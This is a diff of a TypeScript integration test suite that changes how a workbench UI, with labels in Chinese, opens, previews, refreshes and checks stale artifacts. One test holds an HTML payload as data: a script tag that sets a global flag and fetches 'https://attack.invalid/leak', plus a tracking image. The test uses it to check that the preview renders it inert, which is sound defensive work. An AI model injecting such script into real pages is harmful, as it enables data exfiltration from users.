@@ -1416,6 +1416,7 @@ suite('B1 production Bridge authority assembly / real PostgreSQL', () => {
       text = 'first line\nsecond line',
       parentObjectId?: string,
       kind: 'document' | 'plan' | 'changeset' = 'document',
+      fileName = kind === 'changeset' ? 'changeset.json' : 'fixture.txt',
     ) =>
       publishWorkbenchArtifact(
         {
@@ -1423,7 +1424,7 @@ suite('B1 production Bridge authority assembly / real PostgreSQL', () => {
           sessionId: f.sessionId,
           callId,
           kind,
-          fileName: kind === 'changeset' ? 'changeset.json' : 'fixture.txt',
+          fileName,
           format: kind === 'changeset' ? 'json' : 'text',
           bytes: Buffer.from(text),
           mediaType: kind === 'changeset' ? 'application/json' : 'text/plain',
@@ -3405,6 +3406,7 @@ suite('B1 production Bridge authority assembly / real PostgreSQL', () => {
         JSON.stringify(changes),
         undefined,
         'changeset',
+        'browser-change.json',
       );
       const html =
         '<script>globalThis.P07_ATTACK=1;fetch("https://attack.invalid/leak")</script><img src="https://attack.invalid/pixel">';
@@ -3457,6 +3459,7 @@ suite('B1 production Bridge authority assembly / real PostgreSQL', () => {
         }),
         undefined,
         'changeset',
+        'large-changeset.json',
       );
       const evidenceDir = await mkdtemp(resolve('.local/p07-browser-'));
       const require = createRequire(resolve('apps/worker/package.json'));
@@ -3674,9 +3677,16 @@ suite('B1 production Bridge authority assembly / real PostgreSQL', () => {
         await page
           .getByRole('button', { name: '工件与审查', exact: true })
           .click();
-        await activeContent
-          .getByLabel('成果版本', { exact: true })
-          .selectOption(change.id);
+        const openArtifact = async (artifact: typeof change) => {
+          await page
+            .locator('main > section')
+            .getByRole('button', {
+              name: `侧栏预览 ${artifact.version.fileName}`,
+              exact: true,
+            })
+            .click();
+        };
+        await openArtifact(change);
         await page.waitForSelector('[data-cline-diff] diffs-container');
         await page.waitForFunction(() => {
           const root = document.querySelector(
@@ -3689,15 +3699,14 @@ suite('B1 production Bridge authority assembly / real PostgreSQL', () => {
         });
         expect(
           await activeContent
-            .getByText('比较范围：本次 Changeset 提案', { exact: false })
-            .first()
-            .isVisible(),
-        ).toBe(true);
+            .getByLabel('提案文件', { exact: true })
+            .inputValue(),
+        ).toBe('answer.ts');
         await page.screenshot({ path: join(evidenceDir, 'desktop-diff.png') });
         expect(await activeContent.getByRole('textbox').count()).toBe(0);
         expect(
           await activeContent
-            .getByRole('link', { name: '下载此版本' })
+            .getByRole('link', { name: '下载', exact: true })
             .isVisible(),
         ).toBe(true);
         expect(
@@ -3714,16 +3723,30 @@ suite('B1 production Bridge authority assembly / real PostgreSQL', () => {
         expect(
           await database`select id from allrice_runtime_operations where organization_id=${f.context.organizationId}`,
         ).toHaveLength(0);
+        await openArtifact(textArtifact);
         await activeContent
-          .getByLabel('成果版本', { exact: true })
-          .selectOption(textArtifact.id);
+          .getByText('second line', { exact: false })
+          .waitFor();
         const revisedDoc = await f.publish(
           'doc-revision',
           'first line\nrevised line',
           textArtifact.object.id,
         );
-        await activeContent.getByText('旧版本 · 仅查看').waitFor();
-        await page.getByRole('button', { name: '查看最新版本' }).click();
+        expect(
+          (
+            await getWorkbenchArtifact(
+              f.context,
+              f.sessionId,
+              textArtifact.id,
+              database,
+            )
+          ).stale,
+        ).toBe(true);
+        expect(await activeContent.innerText()).toContain('second line');
+        await activeContent
+          .getByRole('button', { name: '刷新文件', exact: true })
+          .click();
+        await openArtifact(revisedDoc);
         await activeContent
           .getByText('revised line', { exact: false })
           .waitFor();
@@ -3737,24 +3760,15 @@ suite('B1 production Bridge authority assembly / real PostgreSQL', () => {
             )
           ).stale,
         ).toBe(false);
-        await page
-          .getByRole('button', { name: '刷新列表', exact: true })
-          .click();
-        await activeContent
-          .getByLabel('成果版本', { exact: true })
-          .selectOption(htmlArtifact.id);
+        await openArtifact(htmlArtifact);
         await activeContent.getByText(html, { exact: false }).first().waitFor();
-        await activeContent
-          .getByLabel('成果版本', { exact: true })
-          .selectOption(svgArtifact.id);
+        await openArtifact(svgArtifact);
         await activeContent.getByText(svg, { exact: false }).first().waitFor();
         expect(
           await page.evaluate(() => Reflect.get(globalThis, 'P07_ATTACK')),
         ).toBeUndefined();
         expect(external).toEqual([]);
-        await activeContent
-          .getByLabel('成果版本', { exact: true })
-          .selectOption(largeArtifact.id);
+        await openArtifact(largeArtifact);
         await activeContent
           .getByText('文件过长，已停用富 Diff。', { exact: false })
           .waitFor();
@@ -4275,6 +4289,7 @@ suite('B1 production Bridge authority assembly / real PostgreSQL', () => {
       ).build;
       const assets = await build({
         entryPoints: [resolve('apps/web/test/local-command-page.tsx')],
+        loader: { '.woff2': 'dataurl', '.woff': 'dataurl', '.ttf': 'dataurl' },
         bundle: true,
         write: false,
         outdir: tmpdir(),
